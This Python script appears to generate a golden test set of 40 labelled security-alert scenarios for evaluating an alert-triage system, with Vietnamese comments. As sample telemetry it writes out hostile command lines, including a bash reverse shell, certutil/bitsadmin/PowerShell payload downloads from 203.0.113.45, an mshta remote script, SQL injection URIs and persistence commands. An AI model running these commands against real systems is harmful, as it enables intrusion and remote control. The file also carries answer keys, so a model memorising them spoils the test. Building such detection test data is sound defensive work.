"""golden/build_scenarios.py — sinh golden/scenarios.json (40 kịch bản vàng).

Chạy:  python golden/build_scenarios.py
"""
import json
from pathlib import Path

OUT = Path(__file__).parent / "scenarios.json"
T0 = "2026-09-27T01:00:00Z"


# ---------- Helper dựng alert theo hợp đồng 7.1 ----------

def alert(aid, rule, level, ids, surface, ts, src, dst, dport, host, fields=None):
    return {
        "alert_id": aid, "rule_name": rule, "rule_level": level,
        "attack_ids": ids, "surface": surface, "timestamp": ts,
        "src_ip": src, "dest_ip": dst, "dest_port": dport, "host": host,
        "summary": f"{rule} | {src} -> {dst}:{dport} | host={host}",
        "fields": fields or {},
    }


def scenario(sid, name, alerts, is_attack, severity, attack_ids, action, notes=""):
    return {
        "id": sid, "name": name, "alerts": alerts,
        "ground_truth": {
            "is_attack": is_attack, "severity": severity,
            "attack_ids": attack_ids, "correct_action": action, "notes": notes,
        },
    }


def suricata(aid, ts, src, dst, dport, sig="ET SCAN Possible TCP Port Scan",
             sid=2001219, proto="TCP", app="failed", pkts=1, bytes_=60):
    return alert(
        aid, "Network Port Scan Detected", "medium", ["T1595", "T1046"],
        "network", ts, src, dst, dport, "sensor-net-01",
        {"proto": proto, "app_proto": app,
         "flow": {"pkts_toserver": pkts, "pkts_toclient": 0,
                  "bytes_toserver": bytes_, "bytes_toclient": 0,
                  "start": ts, "end": ts, "src_ip": src, "dest_ip": dst},
         "signature": sig, "signature_id": sid, "sensor": "suricata-lab"},
    )


def web(aid, ts, src, dst, uri, ua="Mozilla/5.0", rule="Web SQLi Attempt",
        level="high", ids=None, method="GET"):
    return alert(
        aid, rule, level, ids or ["T1190"], "web", ts, src, dst, 80, "proxy01",
        {"request_method": method, "request_uri": uri, "http_user_agent": ua,
         "status": 200, "remote_addr": src},
    )


def sysmon_proc(aid, ts, host, image, cmdline, parent, rule, level, ids,
                user="IIS APPPOOL\\DefaultAppPool"):
    return alert(
        aid, rule, level, ids, "endpoint", ts, "", "", None, host,
        {"event_id": 1, "event_type": "process_creation",
         "Image": image, "CommandLine": cmdline, "ParentImage": parent,
         "User": user, "ProcessId": "6120", "ParentProcessId": "4892",
         "UtcTime": ts.replace("T", " ").rstrip("Z")},
    )


# ============ DANH SÁCH 40 SCENARIO ============

SCENARIOS = []

# --- A. SQLi / Web (6) ---
SCENARIOS += [
    scenario("g-001", "SQLi đơn lẻ từ IP ngoài", [
        web("g001:w1", T0, "203.0.113.45", "192.168.56.20",
            "/dvwa/?id=1%27+OR+%271%27%3D%271", ua="sqlmap/1.7.2"),
    ], True, "high", ["T1190"], "block", "IP ngoài, tài sản high, không có IOC"),

    scenario("g-002", "SQLi từ IP đã có trong IOC nội bộ", [
        web("g002:w1", T0, "192.168.56.10", "192.168.56.20",
            "/dvwa/?id=1%27+UNION+SELECT+1,2,3--"),
    ], True, "high", ["T1190"], "block", "IP khớp local_iocs → block chắc chắn"),

    scenario("g-003", "SQLi từ IP nội bộ chưa biết", [
        web("g003:w1", T0, "192.168.56.77", "192.168.56.20",
            "/dvwa/?id=1%27+OR+1%3D1--"),
    ], True, "high", ["T1190"], "block", "IP nội bộ lạ vẫn phải block"),

    scenario("g-004", "SQLi + upload webshell", [
        web("g004:w1", T0, "203.0.113.45", "192.168.56.20",
            "/dvwa/?id=1%27+OR+%271%27%3D%271"),
        web("g004:w2", T0, "203.0.113.45", "192.168.56.20",
            "/dvwa/hackable/uploads/shell.aspx", method="POST",
            rule="Webshell File Upload", ids=["T1505.003"]),
    ], True, "high", ["T1190", "T1505.003"], "block", "chuỗi SQLi → webshell"),

    scenario("g-005", "SQLi với User-Agent sqlmap rõ ràng", [
        web("g005:w1", T0, "203.0.113.45", "192.168.56.20",
            "/dvwa/?id=1", ua="sqlmap/1.7.2#stable (http://sqlmap.org)"),
    ], True, "high", ["T1190"], "block", "UA sqlmap — tool tự động"),

    scenario("g-006", "SQLi + path traversal", [
        web("g006:w1", T0, "203.0.113.45", "192.168.56.20",
            "/dvwa/?id=1%27+OR+1%3D1--&file=../../etc/passwd"),
    ], True, "high", ["T1190"], "block", "SQLi + path traversal cùng request"),
]

# --- B. Webshell execution (6) ---
SCENARIOS += [
    scenario("g-007", "w3wp sinh cmd.exe /c whoami", [
        sysmon_proc("g007:e1", T0, "web-win-01",
                    "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami",
                    "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
                    "Web Server Spawning Shell", "critical",
                    ["T1505.003", "T1059"]),
    ], True, "critical", ["T1505.003", "T1059"], "block", "webshell RCE kinh điển"),

    scenario("g-008", "w3wp sinh powershell", [
        sysmon_proc("g008:e1", T0, "web-win-01",
                    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "powershell.exe -nop -c \"Get-Process\"",
                    "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
                    "Web Server Spawning Shell", "critical",
                    ["T1505.003", "T1059.001"]),
    ], True, "critical", ["T1505.003", "T1059"], "block", ""),

    scenario("g-009", "php-fpm sinh sh", [
        sysmon_proc("g009:e1", T0, "web-lin-01",
                    "/bin/sh", "sh -c id", "/usr/sbin/php-fpm",
                    "Web Server Spawning Shell", "critical",
                    ["T1505.003", "T1059"], user="www-data"),
    ], True, "critical", ["T1505.003", "T1059"], "block", "webshell PHP"),

    scenario("g-010", "nginx sinh bash", [
        sysmon_proc("g010:e1", T0, "web-lin-01",
                    "/bin/bash", "bash -i >& /dev/tcp/203.0.113.45/4444 0>&1",
                    "/usr/sbin/nginx", "Web Server Spawning Shell", "critical",
                    ["T1505.003", "T1059"], user="www-data"),
    ], True, "critical", ["T1505.003", "T1059"], "block", "reverse shell"),

    scenario("g-011", "webshell + certutil download", [
        sysmon_proc("g011:e1", T0, "web-win-01",
                    "C:\\Windows\\System32\\certutil.exe",
                    "certutil.exe -urlcache -split -f http://203.0.113.45/p.exe C:\\temp\\p.exe",
                    "C:\\Windows\\System32\\cmd.exe",
                    "LOLBAS Certutil Download", "high", ["T1105", "T1033"]),
    ], True, "high", ["T1105"], "block", "tải payload qua certutil"),

    scenario("g-012", "webshell + whoami trinh sát", [
        sysmon_proc("g012:e1", T0, "web-win-01",
                    "C:\\Windows\\System32\\whoami.exe", "whoami /all",
                    "C:\\Windows\\System32\\cmd.exe",
                    "LOLBAS Discovery", "medium", ["T1033"]),
    ], True, "medium", ["T1033"], "review", "trinh sát — mức vừa, chuyển người"),
]

# --- C. PowerShell encoded (4) ---
SCENARIOS += [
    scenario("g-013", "PowerShell -enc đơn lẻ", [
        sysmon_proc("g013:e1", T0, "web-win-01",
                    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "powershell.exe -enc SQBFAFgA",
                    "C:\\Windows\\explorer.exe",
                    "Encoded PowerShell Command", "high", ["T1059.001"]),
    ], True, "high", ["T1059.001"], "block", ""),

    scenario("g-014", "PowerShell -enc từ parent lạ", [
        sysmon_proc("g014:e1", T0, "web-win-01",
                    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMgA3AC4AMAAuADAALgAxAC8AcAAuAHAAcwAxACcAKQA=",
                    "C:\\Windows\\System32\\cmd.exe",
                    "Encoded PowerShell Command", "critical", ["T1059.001"]),
    ], True, "critical", ["T1059.001"], "block", "IEX DownloadString"),

    scenario("g-015", "PowerShell -e -nop -w hidden", [
        sysmon_proc("g015:e1", T0, "web-win-01",
                    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "powershell.exe -e -nop -w hidden ZQBjAGgAbwAgAGgAaQA=",
                    "C:\\Windows\\System32\\cmd.exe",
                    "Encoded PowerShell Command", "high", ["T1059.001"]),
    ], True, "high", ["T1059.001"], "block", ""),

    scenario("g-016", "PowerShell IEX DownloadString", [
        sysmon_proc("g016:e1", T0, "web-win-01",
                    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.45/p.ps1')",
                    "C:\\Windows\\System32\\cmd.exe",
                    "Encoded PowerShell Command", "critical", ["T1059.001", "T1105"]),
    ], True, "critical", ["T1059.001"], "block", ""),
]

# --- D. Persistence (4) ---
SCENARIOS += [
    scenario("g-017", "schtasks tạo task độc", [
        sysmon_proc("g017:e1", T0, "web-win-01",
                    "C:\\Windows\\System32\\schtasks.exe",
                    "schtasks /create /tn Updater /tr C:\\temp\\upd.exe /sc onlogon",
                    "C:\\Windows\\System32\\cmd.exe",
                    "Scheduled Task Created", "high", ["T1053.005"]),
    ], True, "high", ["T1053.005"], "block", ""),

    scenario("g-018", "schtasks + Run key", [
        sysmon_proc("g018:e1", T0, "web-win-01",
                    "C:\\Windows\\System32\\reg.exe",
                    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v X /d C:\\temp\\x.exe",
                    "C:\\Windows\\System32\\cmd.exe",
                    "Registry Run Key Modified", "high", ["T1547.001"]),
    ], True, "high", ["T1547.001"], "block", ""),

    scenario("g-019", "Scheduled task từ webshell", [
        sysmon_proc("g019:e1", T0, "web-win-01",
                    "C:\\Windows\\System32\\schtasks.exe",
                    "schtasks /create /tn GoogleUpdate /tr powershell.exe -enc ZQBjAGgAbwA= /sc minute /mo 5",
                    "C:\\Windows\\System32\\cmd.exe",
                    "Scheduled Task Created", "critical", ["T1053.005", "T1059.001"]),
    ], True, "critical", ["T1053.005"], "block", "persistence + PS encoded"),

    scenario("g-020", "Run key modification EID 13", [
        alert("g020:e1", "Registry Run Key Modified", "high", ["T1547.001"],
              "endpoint", T0, "", "", None, "web-win-01",
              {"event_id": 13, "event_type": "registry_set",
               "TargetObject": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backup",
               "Details": "C:\\Users\\Public\\b.exe"}),
    ], True, "high", ["T1547.001"], "block", ""),
]

# --- E. Discovery / LOLBAS (5) ---
SCENARIOS += [
    scenario("g-021", "whoami", [
        sysmon_proc("g021:e1", T0, "web-win-01",
                    "C:\\Windows\\System32\\whoami.exe", "whoami",
                    "C:\\Windows\\System32\\cmd.exe",
                    "Discovery Whoami", "medium", ["T1033"]),
    ], True, "medium", ["T1033"], "review", ""),

    scenario("g-022", "systeminfo", [
        sysmon_proc("g022:e1", T0, "web-win-01",
                    "C:\\Windows\\System32\\systeminfo.exe", "systeminfo",
                    "C:\\Windows\\System32\\cmd.exe",
                    "Discovery Systeminfo", "low", ["T1082"]),
    ], True, "low", ["T1082"], "review", ""),

    scenario("g-023", "certutil decode", [
        sysmon_proc("g023:e1", T0, "web-win-01",
                    "C:\\Windows\\System32\\certutil.exe", "certutil -decode enc.txt dec.exe",
                    "C:\\Windows\\System32\\cmd.exe",
                    "LOLBAS Certutil", "high", ["T1140"]),
    ], True, "high", ["T1140"], "block", ""),

    scenario("g-024", "bitsadmin download", [
        sysmon_proc("g024:e1", T0, "web-win-01",
                    "C:\\Windows\\System32\\bitsadmin.exe",
                    "bitsadmin /transfer j http://203.0.113.45/p.exe C:\\temp\\p.exe",
                    "C:\\Windows\\System32\\cmd.exe",
                    "LOLBAS Bitsadmin", "high", ["T1105"]),
    ], True, "high", ["T1105"], "block", ""),

    scenario("g-025", "mshta http", [
        sysmon_proc("g025:e1", T0, "web-win-01",
                    "C:\\Windows\\System32\\mshta.exe",
                    "mshta http://203.0.113.45/x.hta",
                    "C:\\Windows\\System32\\cmd.exe",
                    "LOLBAS Mshta", "high", ["T1218.005"]),
    ], True, "high", ["T1218.005"], "block", ""),
]

# --- F. Network / C2 (5) ---
SCENARIOS += [
    scenario("g-026", "HTTP beacon từ process lạ", [
        alert("g026:n1", "Suspicious Outbound HTTP", "high", ["T1071"],
              "network", T0, "192.168.56.20", "203.0.113.45", 8080, "sensor-net-01",
              {"proto": "TCP", "app_proto": "http",
               "flow": {"pkts_toserver": 40, "pkts_toclient": 40,
                        "bytes_toserver": 3200, "bytes_toclient": 2800,
                        "start": T0, "end": T0}}),
    ], True, "high", ["T1071"], "block", ""),

    scenario("g-027", "DNS tunneling", [
        alert("g027:n1", "Suspicious DNS Activity", "high", ["T1071.004"],
              "network", T0, "192.168.56.20", "8.8.8.8", 53, "sensor-net-01",
              {"proto": "UDP", "app_proto": "dns",
               "flow": {"pkts_toserver": 200, "pkts_toclient": 200,
                        "bytes_toserver": 12000, "bytes_toclient": 12000,
                        "start": T0, "end": T0}}),
    ], True, "high", ["T1071.004"], "block", ""),

    scenario("g-028", "Kết nối tới IP C2 đã biết", [
        alert("g028:n1", "Connection to Known C2", "critical", ["T1071"],
              "network", T0, "192.168.56.20", "203.0.113.99", 443, "sensor-net-01",
              {"proto": "TCP", "app_proto": "tls",
               "flow": {"pkts_toserver": 80, "pkts_toclient": 80,
                        "bytes_toserver": 8000, "bytes_toclient": 6500,
                        "start": T0, "end": T0}}),
    ], True, "critical", ["T1071"], "block", "IP C2 trong threat intel"),

    scenario("g-029", "Outbound lớn từ webserver", [
        alert("g029:n1", "Large Outbound Transfer", "high", ["T1041"],
              "network", T0, "192.168.56.20", "203.0.113.45", 443, "sensor-net-01",
              {"proto": "TCP", "app_proto": "tls",
               "flow": {"pkts_toserver": 5000, "pkts_toclient": 5000,
                        "bytes_toserver": 50000000, "bytes_toclient": 5000000,
                        "start": T0, "end": T0}}),
    ], True, "high", ["T1041"], "block", "exfil 50MB ra ngoài"),

    scenario("g-030", "SMB beacon", [
        alert("g030:n1", "SMB Beacon", "high", ["T1071", "T1021.002"],
              "network", T0, "192.168.56.20", "192.168.56.50", 445, "sensor-net-01",
              {"proto": "TCP", "app_proto": "smb",
               "flow": {"pkts_toserver": 30, "pkts_toclient": 30,
                        "bytes_toserver": 4000, "bytes_toclient": 3500,
                        "start": T0, "end": T0}}),
    ], True, "high", ["T1021.002"], "block", ""),
]

# --- G. Reconnaissance (3) ---
SCENARIOS += [
    scenario("g-031", "Port scan từ IP ngoài", [
        suricata("g031:n1", T0, "203.0.113.45", "192.168.56.20", 445),
        suricata("g031:n2", T0, "203.0.113.45", "192.168.56.20", 22),
        suricata("g031:n3", T0, "203.0.113.45", "192.168.56.20", 3389),
    ], True, "medium", ["T1595", "T1046"], "block", ""),

    scenario("g-032", "Port scan từ IP nội bộ lạ", [
        suricata("g032:n1", T0, "192.168.56.77", "192.168.56.20", 80),
        suricata("g032:n2", T0, "192.168.56.77", "192.168.56.20", 443),
    ], True, "medium", ["T1046"], "block", ""),

    scenario("g-033", "Service scan chậm", [
        suricata("g033:n1", T0, "203.0.113.45", "192.168.56.20", 8080),
    ], True, "medium", ["T1046"], "review", "1 kết nối — chưa đủ chắc, chuyển review"),
]

# --- H. Ca âm tính (7) ---
SCENARIOS += [
    scenario("g-034", "IT scanner quét định kỳ", [
        suricata("g034:n1", T0, "192.168.56.30", "192.168.56.20", 80),
        suricata("g034:n2", T0, "192.168.56.30", "192.168.56.20", 443),
    ], False, "low", ["T1046"], "no_action", "IP=it_scanner trong inventory"),

    scenario("g-035", "Health check từ LB", [
        alert("g035:w1", "Web Traffic", "low", [], "web", T0,
              "192.168.56.5", "192.168.56.20", 80, "proxy01",
              {"request_method": "GET", "request_uri": "/health",
               "http_user_agent": "ELB-HealthChecker/2.0", "status": 200}),
    ], False, "low", [], "no_action", "UA health checker"),

    scenario("g-036", "Admin chạy whoami đúng giờ", [
        sysmon_proc("g036:e1", T0, "web-win-01",
                    "C:\\Windows\\System32\\whoami.exe", "whoami",
                    "C:\\Windows\\System32\\cmd.exe",
                    "Discovery Whoami", "low", ["T1033"],
                    user="DOMAIN\\admin"),
    ], False, "low", ["T1033"], "no_action", "user admin, giờ hành chính"),

    scenario("g-037", "PowerShell admin script có chữ ký", [
        sysmon_proc("g037:e1", T0, "web-win-01",
                    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "powershell.exe -File C:\\Scripts\\backup.ps1",
                    "C:\\Windows\\System32\\svchost.exe",
                    "PowerShell Script", "low", [],
                    user="DOMAIN\\backup"),
    ], False, "low", [], "no_action", "script có chữ ký, chạy bởi service"),

    scenario("g-038", "Scan từ monitoring system", [
        suricata("g038:n1", T0, "192.168.56.5", "192.168.56.20", 9100),
    ], False, "low", ["T1046"], "no_action", "IP monitoring"),

    scenario("g-039", "Backup job tạo scheduled task", [
        sysmon_proc("g039:e1", T0, "web-win-01",
                    "C:\\Windows\\System32\\schtasks.exe",
                    "schtasks /create /tn BackupNightly /tr C:\\Scripts\\backup.bat /sc daily /st 02:00",
                    "C:\\Windows\\System32\\svchost.exe",
                    "Scheduled Task Created", "low", ["T1053.005"],
                    user="DOMAIN\\backup"),
    ], False, "low", ["T1053.005"], "no_action", "backup hợp lệ ban đêm"),

    scenario("g-040", "Chrome update check", [
        alert("g040:e1", "Suspicious Outbound HTTP", "low", [],
              "network", T0, "192.168.56.20", "142.250.80.1", 443, "sensor-net-01",
              {"proto": "TCP", "app_proto": "tls",
               "flow": {"pkts_toserver": 20, "pkts_toclient": 20,
                        "bytes_toserver": 3000, "bytes_toclient": 2500,
                        "start": T0, "end": T0}}),
    ], False, "low", [], "no_action", "Google update"),
]


def main():
    OUT.write_text(json.dumps({"scenarios": SCENARIOS}, indent=2, ensure_ascii=False),
                   encoding="utf-8")
    print(f"Đã ghi {len(SCENARIOS)} scenario vào {OUT}")


if __name__ == "__main__":
    main()